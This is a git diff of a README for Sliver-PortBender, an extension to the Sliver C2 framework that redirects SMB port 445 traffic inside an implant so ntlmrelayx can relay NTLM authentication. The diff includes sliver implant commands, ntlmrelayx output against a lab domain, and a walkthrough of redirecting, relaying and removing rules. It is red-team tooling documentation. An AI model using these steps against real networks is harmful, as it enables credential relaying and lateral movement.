@@ -1,7 +1,7 @@
 # Sliver-PortBender
 
 An **extension to Sliver C2**, written as a **learning excercise**, that allows to **manage multiple redirections of traffic, from port to port, inside the same implant**. 
-It maybe useful for performing **NTLM relaying in Sliver** in a similar way to what is described here https://rastamouse.me/ntlm-relaying-via-cobalt-strike/ for Cobalt-Strike. 
+It maybe useful for performing **NTLM relaying in Sliver** in a similar way to what is described here https://rastamouse.me/ntlm-relaying-via-cobalt-strike/ for Cobalt-Strike. I recommend the user to first read the article before in case doesn't have any experience with PortBender.
 **The extension is a DLL wrapping the PortBender Reflective DLL** developed by praetorian-inc here: https://github.com/praetorian-inc/PortBender. Sliver-PortBender performs the same redirection task, 
 performed by the original PortBender, but does everything **inside the same implant with no need to inject into other binaries**.
 
@@ -39,7 +39,7 @@ By running `portbender` you can already get a help message. Here the functionali
 - `portbender list` . List the active redirection rules created with the `redirect command`
 - `portbender remove <id>` . Stop and remove a redirection rule with a given `<id>`. The `<id>` is retrieved through the `portbender list`command.
 
-## Example
+### Example
 
 Here how to use Sliver-Portbender in sliver in order to redirect traffic from port 445 to port 8445 and then relay incoming traffic with ntlmrelayx in the internal network.
 Be careful It is first necessary to upload `WinDivert64.sys` in the pivot machine to the path `C:\Windows\System32\drivers`. Later it is necessary to change directory to `C:\Windows\System32\drivers`.
@@ -73,18 +73,6 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Setting up RAW Server on port 6666
 
 [*] Servers started, waiting for connections
-[*] SMBD-Thread-4 (process_request_thread): Received connection from 192.168.161.50, attacking target smb://WIN-ICSQJ44N1F3.contoso.local
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  win-icsqj44n1f3.contoso.local:445  ...  OK
-[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
-[-] Authenticating against smb://WIN-ICSQJ44N1F3.contoso.local as CONTOSO/ADMINISTRATOR FAILED
-[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.161.50, attacking target smb://WIN-ICSQJ44N1F3.contoso.local
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  win-icsqj44n1f3.contoso.local:445  ...  OK
-[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
-[-] Authenticating against smb://WIN-ICSQJ44N1F3.contoso.local as CONTOSO/ADMINISTRATOR FAILED
-[*] SMBD-Thread-6 (process_request_thread): Received connection from 192.168.161.50, attacking target smb://WIN-ICSQJ44N1F3.contoso.local
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  win-icsqj44n1f3.contoso.local:445  ...  OK
-[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
-[-] Authenticating against smb://WIN-ICSQJ44N1F3.contoso.local as CONTOSO/ADMINISTRATOR FAILED
 
 ```
 
@@ -132,5 +120,59 @@ sliver (RIPE_COUNCILOR) > portbender list
 
 
 sliver (RIPE_COUNCILOR) > 
+```
+
+Generating some traffic towards port 445 on the pivot machine (ip=192.168.161.30) where the implant is running:
+```
+C:\Users\Administrator>dir \\192.168.161.30\c$
+The user name or password is incorrect.
+
+C:\Users\Administrator>
+```
+
+Notice ntlmrelayx captured and relayed some traffic towards another machine in the internal network:
+
+![immagine](https://user-images.githubusercontent.com/74059030/208508027-c9e472d8-5b70-4722-a675-f07baf8cf768.png)
+
+Removing the port redirection rule in the sliver implant:
+```
+
+sliver (RIPE_COUNCILOR) > portbender remove 0
+
+[*] Successfully executed portbender
+[*] Got output:
+successfully removed redirection with Id 0
+
+
+sliver (RIPE_COUNCILOR) > portbender list
+
+[*] Successfully executed portbender
+[*] Got output:
+Nothing to show
+
+
+sliver (RIPE_COUNCILOR) >
+
+```
+
+Notice now the previous command used to generate traffic executes successfully:
+```
+C:\Users\Administrator>dir \\192.168.161.30\c$
+ Volume in drive \\192.168.161.30\c$ has no label.
+ Volume Serial Number is 9E5A-B257
+
+ Directory of \\192.168.161.30\c$
+
+12/07/2019  10:14 AM    <DIR>          PerfLogs
+12/17/2022  10:43 AM    <DIR>          Program Files
+11/20/2022  12:58 PM    <DIR>          Program Files (x86)
+11/05/2022  12:26 PM    <DIR>          tmp
+12/18/2022  11:34 AM    <DIR>          Users
+12/18/2022  12:43 AM    <DIR>          Windows
+02/21/2022  07:34 PM    <DIR>          Windows10Upgrade
+               0 File(s)              0 bytes
+               7 Dir(s)   5,434,863,616 bytes free
+
+C:\Users\Administrator>
 ```
 
